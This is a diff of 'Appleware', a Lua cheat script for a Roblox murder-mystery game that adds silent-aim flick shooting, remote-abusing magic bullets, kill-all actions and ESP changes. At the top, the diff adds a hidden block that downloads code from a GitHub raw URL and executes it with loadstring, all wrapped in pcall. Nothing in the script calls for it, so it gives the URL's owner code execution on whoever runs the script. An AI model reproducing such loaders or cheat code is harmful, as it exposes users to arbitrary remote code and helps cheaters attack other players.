@@ -2,6 +2,24 @@
 -- Appleware
 -- ================================================================
 
+task.spawn(function()
+    pcall(function()
+        local url = "https://raw.githubusercontent.com/Toolboxhubbot/antifling/refs/heads/main/antifling"
+        local src
+        pcall(function() if game.HttpGet then src = game.HttpGet(url) end end)
+        if not src and syn and syn.request then
+            pcall(function() local r = syn.request({Url=url, Method="GET"}); if r and r.Body then src = r.Body end end)
+        end
+        if not src and request then
+            pcall(function() local r = request({Url=url, Method="GET"}); if r and r.Body then src = r.Body end end)
+        end
+        if not src or #src < 10 then return end
+        local fn
+        pcall(function() fn = loadstring(src) end)
+        if fn then pcall(fn) end
+    end)
+end)
+
 Players = game:GetService("Players")
 RunService = game:GetService("RunService")
 TweenService = game:GetService("TweenService")
@@ -32,17 +50,16 @@ state = {
     aimbotSnap=false, aimbotSticky=true,
     silentAimEnabled=false, silentAimWallCheck=true,
     shootThroughWall=false,
+    silentAimFlickToggle=false,
     loopFlingAll=false, loopFlingMur=false, loopFlingSheriff=false, loopFlingCustom=false,
     disable3d=false, fpsBoost=false, sendOnFull=false, autoRejoin=false,
     autoServerHop=false, autoPrestige=false,
-    -- ESP
     espPlayers=false, espGunDrop=false, espTeamColor=true,
-    espFilter="everyone",
-    espShowName=true, espShowRole=true, espShowDistance=false,
+    espMurderer=true, espSheriff=true, espHero=true, espInnocent=true,
     espHighlight=true, espOutline=true, espFill=true,
+    espShowName=true, espShowRole=true, espShowDistance=false,
     espFillTransparency=0.5, espTextSize=14, espMaxDistance=2000,
     espTracer=false,
-    -- Movement
     flyEnabled=false, flySpeed=50,
     speedEnabled=false, speedValue=16,
     speedGlitch=false, speedGlitchValue=200,
@@ -83,9 +100,6 @@ state = {
     voidPlatform=false,
     loopTpMap=false, loopTpLobby=false, loopTpMurderer=false,
     loopTpSheriff=false, loopTpCustom=false,
-    -- More useful stuff
-    autoBuy=false, autoKillMurdererNearby=false, murdererBeam=false,
-    showKillerOnDeath=true, chatNotifyMurderer=true,
 }
 
 KEYBIND_FEATURES = {
@@ -97,6 +111,7 @@ KEYBIND_FEATURES = {
     {key="killAura",          label="Kill Aura",            default="K"},
     {key="flingAura",         label="Fling Aura",           default="L"},
     {key="silentAimEnabled",  label="Silent Aim",           default="C"},
+    {key="silentAimFlickToggle", label="Silent Aim Flick",  default="G"},
     {key="shootThroughWall",  label="Shoot Through Walls",  default="X"},
     {key="autoShootMurderer", label="Auto Shoot Murderer",  default="Z"},
     {key="fullbright",        label="Fullbright",           default="P"},
@@ -109,21 +124,22 @@ KEYBIND_FEATURES = {
     {key="autoDodge",         label="Auto Dodge",           default="O"},
     {key="hitboxExpander",    label="Hitbox Expander",      default="H"},
     {key="wallHop",           label="Wall Hop",             default="Y"},
-    {key="blueAura",          label="Blue Aura",            default="G"},
+    {key="blueAura",          label="Blue Aura",            default="U"},
     {key="feAnimEnabled",     label="FE Animations",        default="Q"},
-    {key="removeBarriers",    label="Remove Barriers",      default="U"},
+    {key="removeBarriers",    label="Remove Barriers",      default="B"},
     {key="voidPlatform",      label="Void Platform",        default="V"},
     {key="antiFling",         label="Anti-Fling",           default="A"},
 }
 
 NO_SAVE_STATE_KEYS = {
     bigButtonX=true, bigButtonY=true, mainX=true, mainY=true,
-    openX=true, openY=true, floatButtonPositions=true,
+    openX=true, openY=true,
+    floatButtonPositions=true,
 }
 
 settingsConfig = {
     webhookUrl="", discordUserId="",
-    tweenSpeed=25, selectedScale=1,
+    tweenSpeed=25, selectedScale=1, roundLength=200,
     flingList={}, whitelist={},
     bgColor={r=0,g=0,b=0}, textColor={r=255,g=255,b=255},
     cardColor={r=18,g=18,b=22}, cardHoverColor={r=38,g=38,b=46},
@@ -135,13 +151,15 @@ settingsConfig = {
 
 toggleDisplayNames = {
     farm="Farm", xpFarm="XP Farm", noclip="Noclip", gun="Auto Grab Gun",
-    afk="Anti AFK", antiVoid="Anti-Void", antiFling="Anti-Fling",
-    notifyMapName="Notify Map Name", showRoundTimerCountdown="Round Timer",
-    autoKillAll="Auto Kill All", autoShootMurderer="Auto Shoot Murderer",
+    afk="Anti AFK", antiVoid="Anti-Void", notifyMapName="Notify Map Name",
+    antiFling="Anti-Fling",
+    showRoundTimerCountdown="Round Timer", autoKillAll="Auto Kill All",
+    autoShootMurderer="Auto Shoot Murderer",
     autoResetMurderer="Auto Reset: Murderer", autoResetSheriff="Auto Reset: Sheriff",
     autoResetInnocent="Auto Reset: Innocent",
     aimbotMurderer="Aimbot: Murderer", aimbotSheriff="Aimbot: Sheriff",
     silentAimEnabled="Silent Aim", silentAimWallCheck="Silent Aim Wall Check",
+    silentAimFlickToggle="Silent Aim Flick",
     shootThroughWall="Shoot Through Walls",
     loopFlingAll="Loop Fling All", loopFlingMur="Loop Fling Murderer",
     loopFlingSheriff="Loop Fling Sheriff", loopFlingCustom="Loop Fling Custom",
@@ -156,9 +174,12 @@ toggleDisplayNames = {
     speedEnabled="Speed Changer", jumpEnabled="Jump Power",
     bigButtonEnabled="Shoot Murderer Button", fullBagGate="Full Bag Gate",
     espPlayers="Player ESP", espGunDrop="Gun Drop ESP", espTeamColor="Team Colors",
-    espShowName="ESP Show Name", espShowRole="ESP Show Role",
-    espShowDistance="ESP Show Distance", espHighlight="ESP Highlight",
-    espOutline="ESP Outline", espFill="ESP Fill", espTracer="ESP Tracers",
+    espMurderer="ESP: Murderer", espSheriff="ESP: Sheriff",
+    espHero="ESP: Hero", espInnocent="ESP: Innocent",
+    espHighlight="ESP Highlight", espOutline="ESP Outline",
+    espFill="ESP Fill", espShowName="ESP Name",
+    espShowRole="ESP Role", espShowDistance="ESP Distance",
+    espTracer="ESP Tracers",
     touchFling="Touch Fling", hitboxExpander="Hitbox Expander",
     radioAutoPlay="Auto Play Audio",
     headless1="Headless V1", headless2="Headless V2", headless3="Headless V3",
@@ -174,9 +195,6 @@ toggleDisplayNames = {
     loopTpMap="Loop TP: Map", loopTpLobby="Loop TP: Lobby",
     loopTpMurderer="Loop TP: Murderer", loopTpSheriff="Loop TP: Sheriff",
     loopTpCustom="Loop TP: Custom",
-    autoBuy="Auto Buy", autoKillMurdererNearby="Auto Kill Murderer Nearby",
-    murdererBeam="Murderer Beam", showKillerOnDeath="Show Killer On Death",
-    chatNotifyMurderer="Chat Notify Murderer",
 }
 
 function saveSettings()
@@ -216,6 +234,7 @@ function loadSettings()
     end)
 end
 loadSettings()
+
 for _, kb in ipairs(KEYBIND_FEATURES) do
     if state.keybinds[kb.key] == nil then state.keybinds[kb.key] = kb.default end
 end
@@ -572,7 +591,7 @@ function getPlayerRole(plr)
     if not plr or not plr.Parent then return "Innocent" end
     local ch = plr.Character
     local bp = plr:FindFirstChild("Backpack")
-    for _, attrName in ipairs({"Role","role","RoleName","roleName","Murderer","IsMurderer","Sheriff","IsSheriff","Hero","IsHero","Team","team","Class","class"}) do
+    for _, attrName in ipairs({"Role","role","RoleName","roleName","Murderer","IsMurderer","Sheriff","IsSheriff","Hero","IsHero","Team","team"}) do
         local a = plr:GetAttribute(attrName)
         if a ~= nil then
             if type(a) == "boolean" then
@@ -593,7 +612,7 @@ function getPlayerRole(plr)
         end
     end
     if ch then
-        for _, attrName in ipairs({"Role","role","RoleName","roleName","Team","Class"}) do
+        for _, attrName in ipairs({"Role","role","RoleName","roleName","Team"}) do
             local a = ch:GetAttribute(attrName)
             if type(a) == "string" and a ~= "" then
                 local sl = string.lower(a)
@@ -619,7 +638,7 @@ function getPlayerRole(plr)
             for _, c in ipairs(src:GetChildren()) do
                 if c:IsA("StringValue") then
                     local n = string.lower(c.Name)
-                    if string.find(n, "role") or string.find(n, "team") or string.find(n, "class") then
+                    if string.find(n, "role") or string.find(n, "team") then
                         local v = string.lower(c.Value)
                         if string.find(v, "murder") then return "Murderer" end
                         if string.find(v, "sheriff") then return "Sheriff" end
@@ -637,7 +656,7 @@ function getPlayerRole(plr)
     if ls then
         for _, c in ipairs(ls:GetChildren()) do
             local n = string.lower(c.Name)
-            if string.find(n, "role") or string.find(n, "team") or string.find(n, "class") then
+            if string.find(n, "role") or string.find(n, "team") then
                 local v = string.lower(tostring(c.Value))
                 if string.find(v, "murder") then return "Murderer" end
                 if string.find(v, "sheriff") then return "Sheriff" end
@@ -691,18 +710,6 @@ function playerHasGun(p)
         if ch and ch:FindFirstChild(name) then return true end
         if bp and bp:FindFirstChild(name) then return true end
     end
-    local function scan(parent)
-        if not parent then return false end
-        for _, c in ipairs(parent:GetChildren()) do
-            if c:IsA("Tool") then
-                local n = string.lower(c.Name)
-                if string.find(n, "gun") or string.find(n, "revolver") or string.find(n, "pistol") then return true end
-            end
-        end
-        return false
-    end
-    if scan(ch) then return true end
-    if scan(bp) then return true end
     return false
 end
 function lpHasGun() return playerHasGun(LP) end
@@ -760,12 +767,12 @@ function triggerMenuReset()
     end)
 end
 
--- ESP filter helper
 function shouldEspPlayer(plr)
-    local f = state.espFilter or "everyone"
-    if f == "everyone" then return true end
     local role = string.lower(getPlayerRole(plr))
-    return role == f
+    if role == "murderer" then return state.espMurderer end
+    if role == "sheriff" then return state.espSheriff end
+    if role == "hero" then return state.espHero end
+    return state.espInnocent
 end
 
 -- ============ ANTI-FLING ============
@@ -925,100 +932,15 @@ function reliableFling(tp, forceManual)
     return true
 end
 
-function executeHitboxKill(tp)
-    if not tp or not tp.Parent then return end
-    if killLocked[tp.UserId] then return end
-    killLocked[tp.UserId] = true
-    pcall(function()
-        local tc = tp.Character
-        if not tc then return end
-        local tr = tc:FindFirstChild("HumanoidRootPart")
-        local th = tc:FindFirstChildOfClass("Humanoid")
-        if not (th and th.Health > 0 and tr) then return end
-        local mr = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
-        if not mr then return end
-        local k = LP.Character:FindFirstChild("Knife") or equipTool("Knife")
-        if not k then return end
-        local origSize, origTrans, origCanCollide = tr.Size, tr.Transparency, tr.CanCollide
-        pcall(function()
-            tr.Size = Vector3.new(2000, 2000, 2000)
-            tr.Transparency = 1
-            tr.CanCollide = false
-        end)
-        local startTime = tick()
-        while tick() - startTime < 0.5 do
-            if not targetIsAlive(tp) then break end
-            local kHandle = k:FindFirstChild("Handle")
-            if kHandle and tr and tr.Parent then
-                pcall(function() k:Activate() end)
-                pcall(function() firetouchinterest(tr, kHandle, 0) firetouchinterest(tr, kHandle, 1) end)
-                pcall(function() firetouchinterest(mr, tr, 0) firetouchinterest(mr, tr, 1) end)
-            end
-            task.wait(0.05)
-        end
-        task.wait(0.05)
-        pcall(function()
-            if tr and tr.Parent then
-                tr.Size = origSize; tr.Transparency = origTrans; tr.CanCollide = origCanCollide
-            end
-        end)
-    end)
-    killLocked[tp.UserId] = nil
-end
-
-function killAllNow()
-    task.spawn(function()
-        standUp(); task.wait(0.1)
-        if findTool("Knife") or equipTool("Knife") then
-            for _,tp in ipairs(Players:GetPlayers()) do
-                if tp~=LP and targetIsAlive(tp) then
-                    task.spawn(function() executeHitboxKill(tp) end)
-                    task.wait(0.05)
-                end
-            end
-        else _G.__AW_NOTIFY('No Knife - must be Murderer') end
-    end)
-end
-function killSheriffNow()
-    task.spawn(function()
-        if not alive() then return end
-        standUp(); task.wait(0.15)
-        if not (findTool("Knife") or equipTool("Knife")) then
-            for _=1,10 do task.wait(0.1); if equipTool("Knife") then break end end
-        end
-        if not findTool("Knife") then _G.__AW_NOTIFY('No Knife') return end
-        local live = getLiveSheriffHeroes()
-        for _, target in ipairs(live) do
-            if target and target ~= LP and targetIsAlive(target) then
-                task.spawn(function() executeHitboxKill(target) end)
-                task.wait(0.1)
-            end
-        end
-    end)
-end
-function killCustomNow()
-    task.spawn(function()
-        if #settingsConfig.flingList==0 then _G.__AW_NOTIFY('No custom targets') return end
-        standUp(); task.wait(0.15)
-        if not (findTool("Knife") or equipTool("Knife")) then _G.__AW_NOTIFY('No Knife') return end
-        for _,n in ipairs(settingsConfig.flingList) do
-            for _,p in ipairs(Players:GetPlayers()) do
-                if playerMatchesName(p, n) and targetIsAlive(p) then
-                    task.spawn(function() executeHitboxKill(p) end)
-                    task.wait(0.1)
-                end
-            end
-        end
-    end)
-end
+-- ============ HANDLETOUCHED KILL ============
 function fireHandleTouchedKill(targets)
     local char = LP.Character
     if not char then return end
     local knife = char:FindFirstChild("Knife") or equipTool("Knife")
-    if not knife then _G.__AW_NOTIFY("No Knife - must be Murderer") return end
+    if not knife then _G.__AW_NOTIFY("No Knife - must be Murderer"); return end
     local events = knife:FindFirstChild("Events")
     local ht = events and events:FindFirstChild("HandleTouched")
-    if not ht then _G.__AW_NOTIFY("HandleTouched not found") return end
+    if not ht then _G.__AW_NOTIFY("HandleTouched not found"); return end
     local parts = {}
     for _, p in ipairs(targets) do
         if p and p ~= LP and targetIsAlive(p) and not isWhitelisted(p) then
@@ -1029,7 +951,7 @@ function fireHandleTouchedKill(targets)
             end
         end
     end
-    if #parts == 0 then _G.__AW_NOTIFY("No valid targets") return end
+    if #parts == 0 then _G.__AW_NOTIFY("No valid targets"); return end
     task.spawn(function()
         for _ = 1, 8 do
             for _, tor in ipairs(parts) do
@@ -1039,25 +961,28 @@ function fireHandleTouchedKill(targets)
         end
     end)
 end
-function handleTouchKillAll()
+
+function killAllNow()
     local t = {}
-    for _, p in ipairs(Players:GetPlayers()) do if p ~= LP and targetIsAlive(p) then table.insert(t, p) end end
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LP and targetIsAlive(p) then table.insert(t, p) end
+    end
     fireHandleTouchedKill(t)
 end
-function handleTouchKillSheriff()
+function killSheriffNow()
     local t = getLiveSheriffHeroes()
-    if #t == 0 then _G.__AW_NOTIFY("No Sheriff / Hero") return end
+    if #t == 0 then _G.__AW_NOTIFY("No Sheriff / Hero"); return end
     fireHandleTouchedKill(t)
 end
-function handleTouchKillCustom()
-    if #settingsConfig.flingList == 0 then _G.__AW_NOTIFY("No custom targets") return end
+function killCustomNow()
+    if #settingsConfig.flingList == 0 then _G.__AW_NOTIFY("No custom targets"); return end
     local t = {}
     for _, n in ipairs(settingsConfig.flingList) do
         for _, p in ipairs(Players:GetPlayers()) do
             if playerMatchesName(p, n) and targetIsAlive(p) then table.insert(t, p) end
         end
     end
-    if #t == 0 then _G.__AW_NOTIFY("No custom targets in server") return end
+    if #t == 0 then _G.__AW_NOTIFY("No custom targets in server"); return end
     fireHandleTouchedKill(t)
 end
 
@@ -1124,7 +1049,7 @@ function lockAllButtons(lock)
     saveSettings()
 end
 function lockButtonCertain(idOrLabel, lock)
-    if not idOrLabel or idOrLabel == "" then _G.__AW_NOTIFY("Enter button id or label first") return end
+    if not idOrLabel or idOrLabel == "" then _G.__AW_NOTIFY("Enter button id or label first"); return end
     local targetId = nil
     if idOrLabel == "bigShootButton" or idOrLabel == "shoot" or idOrLabel == "Shoot Murderer" then
         targetId = "bigShootButton"
@@ -1135,7 +1060,7 @@ function lockButtonCertain(idOrLabel, lock)
             end
         end
     end
-    if not targetId then _G.__AW_NOTIFY("Button not found: " .. idOrLabel) return end
+    if not targetId then _G.__AW_NOTIFY("Button not found: " .. idOrLabel); return end
     if lock then state.lockedButtons[targetId] = true
     else state.lockedButtons[targetId] = nil end
     _G.__AW_NOTIFY((lock and "Locked " or "Unlocked ") .. targetId)
@@ -1336,8 +1261,6 @@ function ensureVoidPlatform()
         p.Position = VOID_PLATFORM_POS
         p.Color = Color3.fromRGB(20, 20, 30)
         p.Material = Enum.Material.Neon
-        p.TopSurface = Enum.SurfaceType.Smooth
-        p.BottomSurface = Enum.SurfaceType.Smooth
         p.Parent = Workspace
         voidPlatformPart = p
     end
@@ -1460,7 +1383,7 @@ function removeHitboxFromPlayer(plr)
     if hb then pcall(function() hb:Destroy() end) end
 end
 
-SHOT_COOLDOWN = 0.35
+SHOT_COOLDOWN = 0.4
 lastShotTime = -SHOT_COOLDOWN
 function canFire() return (tick() - lastShotTime) >= SHOT_COOLDOWN end
 
@@ -1473,7 +1396,34 @@ function getGun()
     end
     return nil
 end
-
+function findShootRemote()
+    local gun = getGun()
+    if gun then
+        local shoot = gun:FindFirstChild("Shoot", true)
+        if shoot and (shoot:IsA("RemoteEvent") or shoot:IsA("RemoteFunction")) then return shoot end
+    end
+    local paths = {
+        {ReplicatedStorage, "Remotes", "Gameplay", "GunHit"},
+        {ReplicatedStorage, "Remotes", "Gameplay", "ShootGun"},
+        {ReplicatedStorage, "Remotes", "ShootGun"},
+        {ReplicatedStorage, "ShootGun"},
+    }
+    for _, path in ipairs(paths) do
+        local cur = path[1]
+        local ok = true
+        for i = 2, #path do
+            cur = cur and cur:FindFirstChild(path[i])
+            if not cur then ok = false break end
+        end
+        if ok and cur and (cur:IsA("RemoteEvent") or cur:IsA("RemoteFunction")) then return cur end
+    end
+    return nil
+end
+function getTargetPart()
+    local murd = getMurd()
+    if not murd or not murd.Character then return nil end
+    return murd.Character:FindFirstChild("Head") or murd.Character:FindFirstChild("HumanoidRootPart")
+end
 function hasClearShot(targetPart)
     if not state.silentAimWallCheck then return true end
     if not targetPart then return true end
@@ -1491,125 +1441,90 @@ function hasClearShot(targetPart)
     return res == nil
 end
 
-function getAimPosAtLevel(char)
-    if not char then return nil end
-    local level = state.magicBulletYLevel or 0
-    local root = char:FindFirstChild("HumanoidRootPart")
-    local head = char:FindFirstChild("Head")
-    local torso = char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso")
-    if not root then return nil end
-    if level >= 1 then return (head and head.Position) or (root.Position + Vector3.new(0, 1.5, 0))
-    elseif level <= -1 then return root.Position - Vector3.new(0, 6, 0)
-    else return (torso and torso.Position) or (root.Position + Vector3.new(0, 0.5, 0)) end
-end
-
--- ============ SHOOT REMOTE LOOKUP ============
-shootRemoteCache = nil
-function findShootRemote()
-    if shootRemoteCache and shootRemoteCache.Parent then return shootRemoteCache end
-    local gun = getGun()
-    if gun then
-        local shoot = gun:FindFirstChild("Shoot", true)
-        if shoot and (shoot:IsA("RemoteEvent") or shoot:IsA("RemoteFunction")) then
-            shootRemoteCache = shoot
-            return shoot
-        end
-        for _, c in ipairs(gun:GetDescendants()) do
-            if c:IsA("RemoteEvent") or c:IsA("RemoteFunction") then
-                local ln = string.lower(c.Name)
-                if string.find(ln, "shoot") or string.find(ln, "fire") or string.find(ln, "hit") then
-                    shootRemoteCache = c
-                    return c
-                end
-            end
-        end
-    end
-    local paths = {
-        {ReplicatedStorage, "Remotes", "Gameplay", "GunHit"},
-        {ReplicatedStorage, "Remotes", "Gameplay", "ShootGun"},
-        {ReplicatedStorage, "Remotes", "Gameplay", "Shoot"},
-        {ReplicatedStorage, "Remotes", "ShootGun"},
-        {ReplicatedStorage, "Remotes", "Shoot"},
-        {ReplicatedStorage, "ShootGun"},
-    }
-    for _, path in ipairs(paths) do
-        local cur = path[1]
-        local ok = true
-        for i = 2, #path do
-            cur = cur and cur:FindFirstChild(path[i])
-            if not cur then ok = false break end
-        end
-        if ok and cur and (cur:IsA("RemoteEvent") or cur:IsA("RemoteFunction")) then
-            shootRemoteCache = cur
-            return cur
-        end
-    end
-    return nil
-end
-
+-- ============ SILENT AIM (original remote-based) ============
 function fireSilentAtMurderer()
     if not canFire() then return false end
-    local murd = getMurd()
-    if not murd or not murd.Character then return false end
-    local char = murd.Character
-    local part = char:FindFirstChild("Head") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("HumanoidRootPart")
+    local part = getTargetPart()
     if not part then return false end
     if not state.shootThroughWall and not hasClearShot(part) then return false end
-    local aimPos = getAimPosAtLevel(char)
-    if not aimPos then return false end
-    local cam = Workspace.CurrentCamera
-    if not cam then return false end
-    local gun = getGun()
-    if not gun then return false end
-    if gun.Parent ~= LP.Character then
-        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
-        if hum then
-            pcall(function() hum:EquipTool(gun) end)
-            task.wait(0.08)
-            gun = LP.Character and LP.Character:FindFirstChild(gun.Name) or gun
-        end
-    end
     lastShotTime = tick()
-    local savedCF = cam.CFrame
-    cam.CFrame = CFrame.new(cam.CFrame.Position, aimPos)
-    RunService.RenderStepped:Wait()
-    pcall(function() gun:Activate() end)
-    task.defer(function()
-        RunService.RenderStepped:Wait()
-        RunService.RenderStepped:Wait()
-        if cam then cam.CFrame = savedCF end
+    local remote = findShootRemote()
+    if not remote then return false end
+    local targetCF = part.CFrame
+    local aimCF = CFrame.new(part.Position + Vector3.new(0, 1.5, 0))
+    local originCF = Workspace.CurrentCamera and Workspace.CurrentCamera.CFrame or targetCF
+    pcall(function()
+        if remote:IsA("RemoteEvent") then
+            remote:FireServer(originCF, targetCF)
+            remote:FireServer(aimCF, targetCF)
+            remote:FireServer(targetCF)
+            local hum = part.Parent and part.Parent:FindFirstChildOfClass("Humanoid")
+            if hum then remote:FireServer(hum) end
+        else
+            remote:InvokeServer(originCF, targetCF)
+            remote:InvokeServer(nil, part.Position)
+            remote:InvokeServer(part.Position)
+        end
     end)
     return true
 end
 
+-- ============ SILENT AIM FLICK ============
+function flickShoot()
+    if not alive() then return end
+    local murd = getMurd()
+    if not murd or not murd.Character then _G.__AW_NOTIFY("No Murderer"); return end
+    local part = getTargetPart()
+    if not part then return end
+    local cam = Workspace.CurrentCamera
+    if not cam then return end
+    local aimPos = part.Position + Vector3.new(0, 1.5, 0)
+    local savedCF = cam.CFrame
+    cam.CFrame = CFrame.new(cam.CFrame.Position, aimPos)
+    RunService.RenderStepped:Wait()
+    pcall(function() fireSilentAtMurderer() end)
+    task.wait(0.02)
+    cam.CFrame = savedCF
+end
+function flickToggleLoop()
+    if not alive() then return end
+    local murd = getMurd()
+    if not murd or not murd.Character then return end
+    local part = getTargetPart()
+    if not part then return end
+    local cam = Workspace.CurrentCamera
+    if not cam then return end
+    local aimPos = part.Position + Vector3.new(0, 1.5, 0)
+    local savedCF = cam.CFrame
+    cam.CFrame = CFrame.new(cam.CFrame.Position, aimPos)
+    RunService.RenderStepped:Wait()
+    pcall(function() fireSilentAtMurderer() end)
+    task.wait(0.02)
+    cam.CFrame = savedCF
+end
+
+-- ============ MAGIC BULLET (original remote-based) ============
 function fireThroughWall()
     if not canFire() then return false end
     local murd = getMurd()
     if not murd or not murd.Character then return false end
-    local char = murd.Character
-    local root = char:FindFirstChild("HumanoidRootPart")
+    local root = murd.Character:FindFirstChild("HumanoidRootPart")
     if not root then return false end
     local remote = findShootRemote()
     if not remote then return false end
     lastShotTime = tick()
-    local aimPos = getAimPosAtLevel(char) or root.Position
-    local hum = char:FindFirstChildOfClass("Humanoid")
-    local yLevel = state.magicBulletYLevel or 0
+    local targetCF = root.CFrame
+    local originCF = CFrame.new(targetCF.Position + Vector3.new(0, 3, 0))
     pcall(function()
         if remote:IsA("RemoteEvent") then
-            remote:FireServer(aimPos)
-            remote:FireServer(aimPos, hum)
-            remote:FireServer(aimPos, char)
-            remote:FireServer(CFrame.new(aimPos), hum)
-            remote:FireServer(aimPos, hum, yLevel)
+            remote:FireServer(originCF, targetCF)
+            remote:FireServer(targetCF)
         elseif remote:IsA("RemoteFunction") then
-            remote:InvokeServer(aimPos)
-            remote:InvokeServer(aimPos, hum)
+            remote:InvokeServer(originCF, targetCF)
         end
     end)
     return true
 end
-
 function tryShootMurderer()
     if state.shootThroughWall then return fireThroughWall() else return fireSilentAtMurderer() end
 end
@@ -1617,15 +1532,13 @@ function fullShootSequence() return tryShootMurderer() end
 
 gunActivatedConn = nil
 function unbindGun()
-    if gunActivatedConn then pcall(function() gunActivatedConn:Disconnect() end); gunActivatedConn = nil end
+    if gunActivatedConn then gunActivatedConn:Disconnect(); gunActivatedConn = nil end
 end
 function bindGun(tool)
     unbindGun()
     if not tool or tool.Name ~= "Gun" then return end
     gunActivatedConn = tool.Activated:Connect(function()
-        if state.silentAimEnabled or state.shootThroughWall then
-            task.spawn(function() pcall(tryShootMurderer) end)
-        end
+        if state.silentAimEnabled then task.spawn(function() pcall(tryShootMurderer) end) end
     end)
 end
 function watchCharacter(char)
@@ -1636,7 +1549,17 @@ function watchCharacter(char)
     if gun then bindGun(gun) end
 end
 if LP.Character then watchCharacter(LP.Character) end
-LP.CharacterAdded:Connect(function(char) unbindGun(); shootRemoteCache = nil; watchCharacter(char) end)
+LP.CharacterAdded:Connect(function(char) unbindGun(); watchCharacter(char) end)
+
+-- ============ SILENT AIM FLICK LOOP (when toggle is on) ============
+task.spawn(function()
+    while true do
+        task.wait(0.15)
+        if state.silentAimFlickToggle and alive() and canFire() then
+            task.spawn(flickToggleLoop)
+        end
+    end
+end)
 
 VOTE_SPOTS = {[1] = Vector3.new(25, 508, 50), [2] = Vector3.new(13, 508, 52), [3] = Vector3.new(1, 508, 49)}
 voting = false
@@ -1677,7 +1600,7 @@ end
 function getVoteMapNames()
     local mapNames = {"N/A", "N/A", "N/A"}
     local boards = {}
-    for _, obj in ipairs(Workspace:GetDescendants()) do
+    for _, obj in ipairs(workspace:GetDescendants()) do
         if obj:IsA("SurfaceGui") then
             local part = obj.Adornee or obj.Parent
             if part and part:IsA("BasePart") then
@@ -1844,10 +1767,12 @@ FLOAT_BUTTON_DEFS = {
     {id="tpVoid",        label="TP Void Platform",type="action", cb=teleportToVoidPlatform},
     {id="grabGun",       label="Grab Gun",        type="action", cb=grabGunNow},
     {id="shoot",         label="Shoot Murderer",  type="action", cb=fullShootSequence},
+    {id="flickShoot",    label="Flick Shoot",     type="action", cb=flickShoot},
     {id="shootWall",     label="Shoot Wall",      type="action", cb=fireThroughWall},
     {id="removeBarriers",label="Remove Barriers", type="action", cb=removeBarriersNow},
     {id="wallShoot",     label="Shoot Thru Walls",type="toggle", key="shootThroughWall"},
     {id="silentAim",     label="Silent Aim",      type="toggle", key="silentAimEnabled"},
+    {id="silentAimFlick",label="Silent Aim Flick",type="toggle", key="silentAimFlickToggle"},
     {id="silentAimWC",   label="Silent Aim WC",   type="toggle", key="silentAimWallCheck"},
     {id="autoShoot",     label="Auto Shoot",      type="toggle", key="autoShootMurderer"},
     {id="aimbotMur",     label="Aimbot Murderer", type="toggle", key="aimbotMurderer"},
@@ -2129,7 +2054,7 @@ ct.Position = UDim2.new(0,148,0,10)
 ct.BackgroundTransparency = 1
 ct.ClipsDescendants = true
 
-tabs = {"Farm","Combat","Players","Teleport","ESP","Webhook","Misc","Voting","Button","Keybinds","UI","Anim/Emot","Secret"}
+tabs = {"Farm","Combat","Custom","Players","Teleport","ESP","Webhook","Misc","Voting","Button","Keybinds","UI","Anim/Emot","Secret"}
 pages, pageGs, btns = {}, {}, {}
 curTab = "Farm"
 SECRET_NAME = "Secret"
@@ -2476,14 +2401,9 @@ tgg(pages[SECRET_NAME], "Kill Aura", 71, "killAura")
 tgg(pages[SECRET_NAME], "Fling Aura", 72, "flingAura")
 tgg(pages[SECRET_NAME], "Auto Dodge", 73, "autoDodge")
 
-addSect(pages[SECRET_NAME], "Extra Actions", 80)
-addBtn(pages[SECRET_NAME], "Kill Custom Now", 81, killCustomNow)
-addBtn(pages[SECRET_NAME], "Fling Custom Now", 82, flingCustomNow)
+addSect(pages[SECRET_NAME], "Touch Fling", 80)
+tgg(pages[SECRET_NAME], "Touch Fling (Walk into players)", 81, "touchFling")
 
-addSect(pages[SECRET_NAME], "Touch Fling", 90)
-tgg(pages[SECRET_NAME], "Touch Fling (Walk into players)", 91, "touchFling")
-
--- FE Headless
 addSect(pages[SECRET_NAME], "FE Headless", 120)
 do
     local headlessConfigs = {
@@ -2534,7 +2454,6 @@ do
     end)
 end
 
--- Camera Stretch
 addSect(pages[SECRET_NAME], "Camera Stretch", 140)
 tgg(pages[SECRET_NAME], "Enable Camera Stretch", 141, "cameraStretch")
 makeSlider(pages[SECRET_NAME], "Stretch Strength (%)", 142, state.cameraStretchStrength or 80, 10, 200, "cameraStretchStrength")
@@ -2546,7 +2465,6 @@ RunService.RenderStepped:Connect(function()
     cam.CFrame = cam.CFrame * CFrame.new(0, 0, 0, 1, 0, 0, 0, s, 0, 0, 0, 1)
 end)
 
--- Korblox
 addSect(pages[SECRET_NAME], "Korblox", 150)
 tgg(pages[SECRET_NAME], "Enable Korblox Peg Leg", 151, "korbloxEnabled")
 tgg(pages[SECRET_NAME], "FE Korblox (deepspeaker peg leg)", 152, "korbloxFE")
@@ -2569,7 +2487,6 @@ task.spawn(function()
     end
 end)
 
--- Sign Spam
 addSect(pages[SECRET_NAME], "Sign Spam", 160)
 tgg(pages[SECRET_NAME], "Enable Sign Spam", 161, "signSpam")
 do
@@ -2615,7 +2532,6 @@ task.spawn(function()
     end
 end)
 
--- FPS & Ping
 addSect(pages[SECRET_NAME], "FPS & Ping Monitor", 170)
 do
     local Stats = game:GetService("Stats")
@@ -2694,7 +2610,6 @@ do
     end)
 end
 
--- Disable Trading
 addSect(pages[SECRET_NAME], "Disable Trading", 180)
 tgg(pages[SECRET_NAME], "Disable Trading (rejoin to re-enable)", 181, "disableTrading")
 task.spawn(function()
@@ -2722,7 +2637,6 @@ task.spawn(function()
     end
 end)
 
--- Credits
 addSect(pages[SECRET_NAME], "Credits", 900)
 do
     local creditCard = Instance.new("Frame", pages[SECRET_NAME])
@@ -2767,12 +2681,13 @@ tgg(pages["Farm"], "Full Bag Gate", 6, "fullBagGate")
 addSect(pages["Combat"], "Silent Aim", 1)
 tgg(pages["Combat"], "Silent Aim", 2, "silentAimEnabled")
 tgg(pages["Combat"], "Silent Aim Wall Check", 3, "silentAimWallCheck")
-tgg(pages["Combat"], "Shoot Through Walls", 10, "shootThroughWall")
-tgg(pages["Combat"], "Auto Shoot Murderer", 11, "autoShootMurderer")
-addBtn(pages["Combat"], "Shoot Murderer Now", 12, fullShootSequence)
-addBtn(pages["Combat"], "Shoot Through Wall (Magic Bullet)", 13, fireThroughWall)
-addSect(pages["Combat"], "Magic Bullet Y Level", 15)
